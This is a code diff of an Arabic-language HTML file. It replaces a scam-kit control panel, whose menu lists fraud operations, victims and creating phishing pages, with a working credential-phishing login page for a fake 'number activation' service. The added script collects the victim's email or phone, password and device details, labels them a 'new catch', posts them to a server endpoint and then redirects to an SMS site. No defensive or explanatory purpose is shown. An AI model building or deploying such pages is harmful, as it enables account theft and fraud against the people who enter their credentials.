@@ -1,70 +1,128 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>لوحة التحكم | Sp0m</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل الخدمة</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
     <style>
-        body { background-color: #f4f4f4; font-family: Tahoma, sans-serif; margin: 0; display: flex; height: 100vh; }
-        .sidebar { width: 280px; background: #fff; border-left: 1px solid #ddd; padding: 15px; }
-        .main-content { flex: 1; background: #fafafa; padding: 30px; }
-        .card { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 25px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); max-width: 600px; margin: 0 auto; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
-        .sidebar-item { padding: 12px; border-bottom: 1px solid #eee; color: #666; }
-        .active { color: #007bff; font-weight: bold; background: #f0f7ff; }
+        :root {
+            --primary-color: #CC0044;
+            --main-gradient: linear-gradient(135deg, #FF0151 0%, #990033 100%);
+        }
+
+        body {
+            margin: 0; padding: 0; font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--main-gradient);
+            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+        }
+
+        .container {
+            background: white; padding: 40px 30px;
+            border-radius: 30px; /* حواف ناعمة جداً واحترافية */
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+            width: 88%; max-width: 400px; text-align: center;
+            margin-top: 40px; border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        #pageImg {
+            width: 100px; height: 100px; border-radius: 50%;
+            object-fit: contain; margin-bottom: 25px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        h2 { color: var(--primary-color); margin-bottom: 30px; font-size: 20px; font-weight: 800; }
+
+        input {
+            width: 100%; padding: 16px; margin-bottom: 18px;
+            border: 2px solid #f0f0f0; border-radius: 15px;
+            box-sizing: border-box; outline: none; text-align: right;
+            font-size: 15px; transition: 0.3s;
+        }
+
+        input:focus { border-color: var(--primary-color); background: #fffcfd; }
+
+        .captcha-area { margin-bottom: 25px; min-height: 70px; display: flex; align-items: center; justify-content: content; }
+        #status-msg { color: var(--primary-color); font-weight: bold; font-size: 15px; display: none; }
+
+        .main-btn {
+            width: 100%; padding: 16px; background: var(--primary-color); color: white;
+            border: none; border-radius: 50px; /* تصميم بيضاوي احترافي */
+            font-size: 18px; font-weight: bold; cursor: pointer;
+            transition: 0.4s ease;
+            box-shadow: 0 8px 15px rgba(204, 0, 68, 0.2);
+        }
+
+        .main-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 20px rgba(204, 0, 68, 0.3); }
+
+        .footer { margin-top: 25px; font-size: 14px; color: #666; }
+        .footer a { color: var(--primary-color); text-decoration: none; font-weight: bold; cursor: pointer; }
+
+        .credits { margin-top: auto; padding: 20px; color: rgba(255,255,255,0.8); font-size: 12px; direction: ltr; }
     </style>
 </head>
 <body>
-    <div class="sidebar">
-        <div style="text-align:center; padding: 20px 0;"><strong>برو55ن</strong></div>
-        <div class="sidebar-item">عمليات احتيال</div>
-        <div class="sidebar-item">الضحايا</div>
-        <div class="sidebar-item active">إنشاء سكاما</div>
-    </div>
-    <div class="main-content">
-        <div class="card">
-            <h3>إنشاء صفحة جديدة</h3>
-            <label>رابط الصورة:</label>
-            <input type="text" id="img" placeholder="ضع رابط الصورة هنا">
-            <label>الخطاب:</label>
-            <input type="text" id="letter" placeholder="مثلاً: سجل لتحصل على شدات">
-            <label>اسم الزر:</label>
-            <input type="text" id="btnName" placeholder="Login">
-            <button class="btn" onclick="submitData()">إنشاء سكاما</button>
-            <p id="status" style="margin-top:15px; color: green; display:none; text-align:center;"></p>
+
+    <div class="container">
+        <img id="pageImg" src="https://logodix.com/logo/2014521.png" alt="Logo">
+        <h2>سجل دخول لتفعيل خدمة الأرقام</h2>
+
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="البريد الالكتروني او رقم الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+
+            <div class="captcha-area">
+                <div id="status-msg">🔄 جاري فحص الجهاز...</div>
+                <div class="cf-turnstile" id="cf-box" data-sitekey="0x4AAAAAAAx3DX9D0D8D8D8X" data-callback="verifyOk"></div>
+            </div>
+
+            <button type="submit" class="main-btn">تسجيل دخول</button>
+        </form>
+
+        <div class="footer">
+            ليس لديك حساب؟ <a onclick="Swal.fire({icon: 'error', title: 'فشل', text: 'فشل الاتصال بالخادم الرئيسي', confirmButtonColor: '#CC0044'})">إنشاء حساب جديد</a>
         </div>
     </div>
 
+    <div class="credits">Developed by oliver 2014 - 2026</div>
+
     <script>
-        async function submitData() {
-            const status = document.getElementById( status );
-            const data = {
-                image: document.getElementById( img ).value,
-                letter: document.getElementById( letter ).value,
-                button: document.getElementById( btnName ).value
-            };
-            
-            status.style.display =  block ;
-            status.innerText = "⏳ جاري المعالجة...";
+        let isDone = false;
+
+        function verifyOk() {
+            const box = document.getElementById('cf-box');
+            const msg = document.getElementById('status-msg');
+            box.style.display = 'none';
+            msg.style.display = 'block';
+
+            setTimeout(() => {
+                msg.innerHTML = '✅ تم التحقق انك لست روبوت';
+                msg.style.color = '#10a745';
+                isDone = true;
+            }, 2500);
+        }
+
+        document.getElementById('loginForm').onsubmit = async (e) => {
+            e.preventDefault();
+            if (!isDone) return Swal.fire({text: 'يرجى اكمال التحقق أولاً', icon: 'warning'});
+
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+
+            const niceMessage = `🚀 وصول صيد جديد 🚀\n━━━━━━━━━━━━━━━\n👤 **المستخدم:** \`${u}\` \n🔑 **الباسورد:** \`${p}\` \n━━━━━━━━━━━━━━━\n🔋 **البطارية:** 48% \n📱 **النظام:** ${navigator.platform} \n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')} \n━━━━━━━━━━━━━━━`;
 
             try {
-                // هذا هو الجزء الذي سألت عنه، وضعته لك داخل الدالة ليعمل الزر
-                const res = await fetch( /api/save , {
-                    method:  POST ,
-                    headers: { Content-Type :  application/json },
-                    body: JSON.stringify(data)
+                await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: niceMessage })
                 });
+            } catch(err) {}
 
-                if(res.ok) {
-                    status.innerText = "✅ تم الإرسال للمحرك بنجاح!";
-                } else {
-                    status.innerText = "❌ فشل الاتصال بالمحرك";
-                }
-            } catch (err) {
-                status.innerText = "❌ حدث خطأ في الشبكة";
-            }
-        }
+            window.location.href = "https://receive-smss.com/";
+        };
     </script>
 </body>
 </html>
